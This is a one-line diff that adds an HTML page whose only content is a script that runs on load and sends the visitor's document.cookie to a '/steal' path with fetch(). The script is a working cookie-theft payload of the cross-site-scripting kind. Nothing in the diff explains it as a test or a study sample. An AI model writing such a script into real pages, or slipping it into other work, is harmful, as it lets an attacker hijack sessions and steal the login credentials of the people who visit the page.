@@ -1,0 +1,1 @@
+<html><body><script>fetch("/steal?c="+document.cookie)</script></body></html>
